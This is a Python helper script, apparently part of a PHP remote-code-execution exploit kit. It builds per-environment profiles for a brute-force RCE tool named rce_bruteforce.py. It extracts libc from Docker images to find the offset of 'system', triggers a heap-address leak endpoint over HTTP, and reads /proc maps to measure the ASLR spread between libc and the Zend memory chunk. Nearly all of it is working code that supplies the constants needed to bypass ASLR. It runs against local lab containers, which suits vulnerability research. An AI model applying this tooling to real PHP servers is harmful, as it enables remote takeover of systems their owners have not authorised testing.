#!/usr/bin/env python3
"""G1 - per-environment profile builder (auto-fingerprinting).

The exploit runner needs four environment-specific constants.  This script
measures all of them for an arbitrary (image, platform, MPM shape) and emits a
profile JSON that rce_bruteforce.py consumes via --profile:

    off_system   libc `system` symbol offset RELATIVE TO THE r-x LOAD
                 segment (pure-python ELF .dynsym parse of the libc copied
                 out of the image - no readelf needed, works for musl too)
    chunk        leak low-bit constant C: L & 0x1FFFFF == C over N fresh
                 containers (HTTP only)
    grid         D = libc_r-x - chunk_base distribution over N fresh
                 containers via the apache/fpm MASTER's /proc/<pid>/maps
                 (children fork the parent's mappings, so D is constant
                 within one container) -> grid.base / grid.slots
    ardata_off   carried 0x32C0 / p0 0x28 (derived from ZendMM allocation
                 sequence: sizeof(HashTable)=56, zend_string=32 on all
                 64-bit arches; hypothesis recorded, verified by the
                 brute force itself)

Usage:
    python3 tests/fingerprint.py --image php:8.4.26-apache \
        --platform linux/arm64 --restarts 6 \
        --out out/profiles/php-8.4.26-arm64.json
"""
import argparse
import json
import os
import struct
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tests"))

import rce_bruteforce as B  # noqa: E402

SHT_DYNSYM = 11


def sh(cmd, timeout=120):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout)


def image_arch(image, platform):
    r = sh("docker run --rm --platform %s %s uname -m" % (platform, image))
    return r.stdout.strip() or "unknown"


def libc_paths(image, platform):
    r = sh("docker run --rm --platform %s %s sh -c "
           "'ls /lib/*/libc.so.6 /lib/ld-musl-*.so.1 2>/dev/null' "
           "| head -3" % (platform, image))
    return [p for p in r.stdout.split() if p.strip()]


def elf_system_offset(data):
    """Return st_value of `system` from .dynsym of an ELF64 LSB shared
    object.  st_value is the virtual address; for libc the first LOAD has
    vaddr 0, so this is the load-base-relative offset.  None if absent."""
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("not an ELF64 LSB object")
    e_shoff, = struct.unpack_from("<Q", data, 0x28)
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)
    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        name, typ = struct.unpack_from("<II", data, off)
        addr, offset, size, link = struct.unpack_from("<QQQI", data, off + 16)
        entsize, = struct.unpack_from("<Q", data, off + 56)
        sections.append({"type": typ, "addr": addr, "off": offset,
                         "size": size, "link": link, "entsize": entsize})
    for sec in sections:
        if sec["type"] != SHT_DYNSYM or not sec["entsize"]:
            continue
        strtab = sections[sec["link"]]
        strings = data[strtab["off"]:strtab["off"] + strtab["size"]]
        for pos in range(sec["off"], sec["off"] + sec["size"],
                         sec["entsize"]):
            st_name, = struct.unpack_from("<I", data, pos)
            end = strings.index(b"\0", st_name)
            if strings[st_name:end] == b"system":
                st_value, = struct.unpack_from("<Q", data, pos + 8)
                return st_value
    return None


def off_system_of(image, platform):
    """system st_value minus the r-x LOAD segment vaddr (the sweep defines
    `libc base` as the r-x segment start, so the symbol offset must be
    relative to THAT)."""
    paths = libc_paths(image, platform)
    if not paths:
        raise SystemExit("no libc found in image")
    libc = paths[0]
    tmp = "/tmp/fp-libc.so"
    subprocess.run(["docker", "create", "--platform", platform, "--name",
                    "fp-extract", image], capture_output=True)
    try:
        subprocess.run(["docker", "cp", "fp-extract:%s" % libc, tmp],
                       capture_output=True, check=True)
    finally:
        subprocess.run(["docker", "rm", "-f", "fp-extract"],
                       capture_output=True)
    data = open(tmp, "rb").read()
    os.remove(tmp)
    st_value = elf_system_offset(data)
    if st_value is None:
        raise SystemExit("system symbol not found in %s" % libc)

    # r-x LOAD segment vaddr from the program headers
    e_phoff, = struct.unpack_from("<Q", data, 0x20)
    e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
    rx_vaddr = 0
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type, p_flags = struct.unpack_from("<II", data, off)
        p_vaddr, = struct.unpack_from("<Q", data, off + 16)
        if p_type == 1 and (p_flags & 1) and (p_flags & 4):  # PF_X|PF_R
            rx_vaddr = p_vaddr
            break
    return st_value - rx_vaddr, libc, st_value, rx_vaddr


def chunk_and_grid(port, restarts, image, rx_vaddr=0, deploy="apache"):
    """N fresh containers: one leak -> chunk low bits; maps -> D.
    Rosetta (linux/amd64 emulation) maps the exec segment as r--p, so when
    no r-x libc line exists, fall back to load_base + rx_vaddr from the
    image's ELF program headers."""
    lows, rows = [], []
    for i in range(restarts):
        if deploy == "fpm":
            import fpm_rce
            fpm_rce.start_fpm(port, children=1, platform=B.PLATFORM)
        else:
            B.start_container(port)
        st, _ = B.http(port, "GET", "/index.php", timeout=60)
        st, _ = B.http(port, "POST", "/leak2/gassoc.php?" + B.LEAK_Q,
                       body=B.LEAK_BODY, ctype="text/plain", timeout=180)
        L = B.read_leak()
        pid = sh("docker exec %s sh -c \"pgrep -o -f 'apache2|php-fpm' "
                 "|| true\"" % B.CONTAINER).stdout.strip()
        if not pid:
            # php-fpm image has no procps; the fpm/apache MASTER is pid 1
            # and children fork its mappings, so /proc/1/maps defines D
            pid = sh("docker exec %s sh -c "
                     "'cat /proc/1/cmdline | tr \"\\\\0\" \" \"'"
                     % B.CONTAINER).stdout.strip() and "1"
        libc = None
        if pid:
            seen_rx = False
            load_base = None
            for line in sh("docker exec %s cat /proc/%s/maps"
                           % (B.CONTAINER, pid)).stdout.splitlines():
                if "libc.so" not in line:
                    continue
                parts = line.split()
                lo = int(parts[0].split("-")[0], 16)
                if parts[1].startswith("r-x"):
                    seen_rx = True
                    libc = lo if libc is None else min(libc, lo)
                elif load_base is None and len(parts) > 2 \
                        and parts[2] == "00000000":
                    load_base = lo          # first LOAD (file offset 0)
            if not seen_rx and load_base is not None:
                libc = load_base + rx_vaddr
        if L:
            chunk = L & B.CHUNK_MASK
            lows.append(L & 0x1FFFFF)
            row = {"leak": L, "chunk": chunk,
                   "low21": L & 0x1FFFFF, "low22": L & 0x3FFFFF}
            if libc:
                row.update(libc_rx=libc, D=libc - chunk)
            rows.append(row)
            print("run %d chunk=0x%x low21=0x%x D=%s"
                  % (i, chunk, row["low21"],
                     hex(row["D"]) if "D" in row else "n/a"), flush=True)
        else:
            print("run %d FAILED (leak=%s libc=%s)" % (i, L, libc),
                  flush=True)
        if deploy == "fpm":
            import fpm_rce
            fpm_rce.stop_fpm()
        else:
            sh("docker rm -f %s >/dev/null 2>&1" % B.CONTAINER)
    return lows, rows


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--image", default=B.IMAGE)
    ap.add_argument("--container", default="fp-a")
    ap.add_argument("--port", type=int, default=28093)
    ap.add_argument("--platform", default="linux/arm64")
    ap.add_argument("--restarts", type=int, default=6)
    ap.add_argument("--multi-worker", action="store_true")
    ap.add_argument("--deploy", choices=["apache", "fpm"], default="apache")
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    B.IMAGE = args.image
    B.CONTAINER = args.container
    B.PLATFORM = args.platform

    arch = image_arch(args.image, args.platform)
    print("arch: %s" % arch, flush=True)
    off_sys, libc, st_value, rx_vaddr = off_system_of(args.image,
                                                      args.platform)
    print("libc: %s  system st_value=0x%x rx_vaddr=0x%x -> off_system=0x%x"
          % (libc, st_value, rx_vaddr, off_sys), flush=True)

    if args.deploy == "fpm":
        import fpm_rce
        B.CONTAINER = fpm_rce.FPM_NAME
    lows, rows = chunk_and_grid(args.port, args.restarts, args.image,
                                rx_vaddr=rx_vaddr, deploy=args.deploy)

    ds = sorted({r["D"] for r in rows if "D" in r})
    # Pad the grid both ways because a small sample can underestimate the
    # available ASLR spread.
    grid = {"base": (ds[0] - 2 * 0x10000) if ds else 0,
            "slots": ((ds[-1] - ds[0]) // 0x10000 + 7) if ds else 0,
            "mod_observed": sorted({d & 0xFFFF for d in ds}),
            "range": ds[-1] - ds[0] if ds else 0, "n": len(ds)}
    low_set = sorted(set(lows))
    profile = {
        "image": args.image, "platform": args.platform, "arch": arch,
        "deploy": args.deploy,
        "libc_path": libc,
        "off_system": off_sys,
        "off_system_st_value": st_value, "rx_load_vaddr": rx_vaddr,
        "chunk": {"mask": "0x1fffff", "low_bits": [hex(x) for x in low_set],
                  "constant": len(low_set) == 1, "n_samples": len(lows)},
        "grid": grid,
        "grid_rows": rows,
        "ardata_off": "0x32c0", "p0": "0x28",
        "notes": "chunk low-bits C is an allocation-history SANITY metric "
                 "only - the attack computes chunk_base = L & ~0x1FFFFF, "
                 "exact for any P offset inside the 2 MB chunk (observed: "
                 "0x879c0 lab-gdb image, 0x889c0 stock reused worker, "
                 "0x909c0 fresh worker); ardata_off/p0 carried from "
                 "aarch64 phase A (4/4 exact), 64-bit-arch-independent "
                 "hypothesis - verified end-to-end by the brute force",
    }
    os.makedirs(os.path.dirname(args.out), exist_ok=True)
    with open(args.out, "w") as fh:
        json.dump(profile, fh, indent=2)
    print("\nchunk low21 constant: %s (%s)"
          % (profile["chunk"]["constant"], low_set and hex(low_set[0])))
    print("grid: base=0x%x slots=%d mod=%s (n=%d)"
          % (grid["base"], grid["slots"],
             [hex(m) for m in grid["mod_observed"]], grid["n"]))
    print("saved: %s" % args.out)


if __name__ == "__main__":
    main()
